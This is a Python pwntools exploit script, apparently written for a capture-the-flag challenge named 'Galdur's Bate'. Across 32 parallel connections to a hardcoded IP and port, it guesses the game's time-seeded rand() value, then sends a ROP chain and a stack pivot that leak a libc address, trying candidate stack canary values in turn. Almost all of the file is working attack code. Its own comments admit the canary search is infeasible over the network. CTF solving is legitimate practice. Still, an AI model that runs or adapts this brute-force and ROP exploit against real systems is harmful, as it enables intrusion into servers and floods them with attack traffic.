#!/usr/bin/env python3
"""
Parallel canary searcher for Galdur's Bate.
Tests full 8-byte canary values using many parallel connections.
Searches linearly from a starting offset.
"""

import os, sys, struct, subprocess, time, itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

os.chdir(os.path.dirname(os.path.abspath(__file__)))
from pwn import *
context.log_level = 'warn'

exe = ELF("./galdurs_bate_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

POP_RDI   = 0x4012BE
LEAVE_RET = 0x40221E
PLAYER_DESC = 0x405540
MAIN = exe.symbols["main"]

HOST = "178.105.86.125"
PORT = 26102
WORKERS = 32
BATCH_SIZE = 1024


def rand_for_seed(seed):
    r = subprocess.run(
        ["./ld-2.39.so", "--library-path", ".", "/tmp/rand_test", str(seed)],
        capture_output=True, timeout=3
    )
    return struct.unpack("<i", r.stdout[:4])[0]


def s64(v):
    return struct.unpack("<q", p64(v & 0xFFFFFFFFFFFFFFFF))[0]


def build_stage1_rop():
    return flat(POP_RDI, exe.got["puts"], exe.plt["puts"], MAIN)


def build_description(rop):
    return flat({0: p64(0), 8: rop}, filler=b"\x00", length=200)


def test_canary(canary, timeout=8):
    """Test a single canary value. Returns (canary, True) if correct, else (canary, False)."""
    try:
        io = remote(HOST, PORT, timeout=timeout)
        now = int(time.time())

        io.recvuntil(b"Chracter name: ")
        io.send(b"AAAAAAAA")
        for p in (b"strength", b"dexterity", b"charisma"):
            io.recvuntil(p)
            io.sendline(b"1")

        io.recvuntil(b"Character description: ")
        io.send(build_description(build_stage1_rop()))

        io.recvuntil(b"Enter your choice: ")
        io.send(b"1\n")
        io.recvuntil(b"Enter your choice: ")
        io.send(b"4\n")
        io.recvuntil(b"Enter your guess: ")

        guess = rand_for_seed(now)
        io.sendline(str(guess).encode())
        resp = io.recvuntil([b"strength", b"Incorrect"], timeout=3)
        if b"Incorrect" in resp:
            io.close()
            return canary, False

        io.recvuntil(b": ")
        io.sendline(str(s64(canary)).encode())
        io.recvuntil(b"Menthara's dexterity")
        io.recvuntil(b": ")
        io.sendline(str(PLAYER_DESC).encode())
        io.recvuntil(b"Menthara's charisma")
        io.recvuntil(b": ")
        io.sendline(str(LEAVE_RET).encode())

        io.recvuntil(b"Enter your choice: ")
        io.send(b"5\n")

        data = io.recvall(timeout=5)
        io.close()
        if b"stack smashing" in data:
            return canary, False
        # libc leak is 6+ bytes of address; game restart is longer
        return canary, len(data) >= 6 and b"Welcome" in data

    except Exception:
        return canary, False


def search_range(start, end, step=0x100):
    """
    Search canary values from `start` to `end`, stepping by `step`.
    Canary format: 0x??????????????00 (LSB always 0x00).
    We search with step 0x100 to skip invalid values (those with non-zero LSB).
    """
    total = (end - start) // step
    tested = 0
    log.info(f"Searching range [{hex(start)}, {hex(end)}] step={hex(step)} ({total} values)")

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        # Submit in batches
        batch = []
        for val in range(start, end, step):
            batch.append(pool.submit(test_canary, val))
            if len(batch) >= BATCH_SIZE:
                for f in as_completed(batch):
                    c, ok = f.result()
                    tested += 1
                    if ok:
                        log.success(f"CANARY FOUND: {hex(c)} (after {tested} attempts)")
                        # Cancel remaining futures
                        for bf in batch:
                            bf.cancel()
                        return c
                    if tested % 100 == 0:
                        sys.stdout.write(f"\r  tested: {tested}/{total}  ({tested*100//total}%)")
                        sys.stdout.flush()
                batch = []

        # Process remaining batch
        for f in as_completed(batch):
            c, ok = f.result()
            tested += 1
            if ok:
                log.success(f"CANARY FOUND: {hex(c)} (after {tested} attempts)")
                return c

    sys.stdout.write("\n")
    log.info(f"Search complete. Tested {tested} values. No match found.")
    return None


if __name__ == "__main__":
    log.setLevel('info')

    # Canary format: 0x??????????????00 (8 bytes, LSB = 0x00)
    # Step by 0x100 to only test valid canary-aligned values.
    STEP = 0x100

    # Search from 0 upwards in ranges of 0x100000 (65536 attempts per batch)
    # This is a SAMPLE size. Full search space is ~2^48 valid values.
    # In practice, this will take too long for a random canary.
    # We start with a small range to test if the canary is small.

    RANGE_SIZE = 0x100000  # ~1 million raw values → 4096 valid canary values
    MAX_RANGES = 10        # search up to 10 ranges

    for i in range(MAX_RANGES):
        start = i * RANGE_SIZE
        end = start + RANGE_SIZE
        result = search_range(start, end, STEP)
        if result is not None:
            print(f"\nCANARY = {hex(result)}")
            print(f"Run: ./new_solve.py {HOST} {PORT} --canary {hex(result)} --libc-base 0x...")
            sys.exit(0)

    print("\nCanary not found in searched range.")
    print("The canary has 56 bits of entropy; brute-force via network is infeasible.")
    print("You need the canary from another source (hint, organizer, etc.)")
